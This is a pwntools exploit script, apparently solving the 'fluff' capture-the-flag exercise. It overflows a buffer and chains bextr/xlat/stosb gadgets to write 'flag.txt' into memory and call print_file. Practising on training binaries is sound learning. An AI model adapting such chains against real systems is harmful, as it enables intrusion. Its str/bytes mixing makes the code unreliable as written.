#!/usr/bin/env python
from pwn import *

# setup binary
elf = context.binary = ELF('fluff')
io = process(elf.path)

#memory values
xlat = 0x0000000000400628
stosb = 0x400639
bss = 0x601038
print_file = 0x400510
pop_rdi = 0x4006a3
pop_rdx_rcx_add_rcx_bextr = 0x40062a
flag_locations = [0x3c4, 0x239, 0x3d6, 0x3cf, 0x24e, 0x192, 0x246, 0x192]
actual_locations = []
current_rax = 0xb
for i in flag_locations: # as binary is loaded at 0x400000
    i = hex(i + 0x400000)
    actual_locations.append(i)
print(actual_locations)
'''
1. bextr sets value of %rbx to (%rdx bits) of %rcx
2. xlat sets value of %rax to ptr*%rbx (only 1 byte)
3. pop rdi and send address of .bss(with offset)
4. stosb sets value of ptr*rdi to %rax
%rdx contains number of bits
%rdx = 0x4003c4
%rdx = rdx + 0x3ef2 # will have to subtract this
bextr
rcx = 0x66 #f
rdx = 0x0008 index value + length
'''

flag = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']

#creating payload
buf = ""
buf += b'A'*40

# for i in actual_locations:
for i in range(0,8):
    if(i!=0):
        current_rax = ord(flag[i-1])
    buf += p64(pop_rdx_rcx_add_rcx_bextr)
    buf += p64(0x4000)
    p = int(actual_locations[i], 16) - current_rax - 0x3ef2
    print(p)
    buf += p64(p)
    buf += p64(xlat)
    buf += p64(pop_rdi)
    buf += p64(bss+i)
    buf += p64(stosb)

#print file 
buf += p64(pop_rdi)
buf += p64(bss)
buf += p64(print_file)

# sending payload
print(buf)
io.sendline(buf)
io.interactive()

'''
Finding places in memory where these charecters appear
with open('fluff', 'rb') as f:
  s = f.read()
for i in b'flag.txt':
  print(i + ' -> ' + hex(s.find(i)))
f -> 0x3c4
l -> 0x239
a -> 0x3d6
g -> 0x3cf
. -> 0x24e
t -> 0x192
x -> 0x246
t -> 0x192
'''
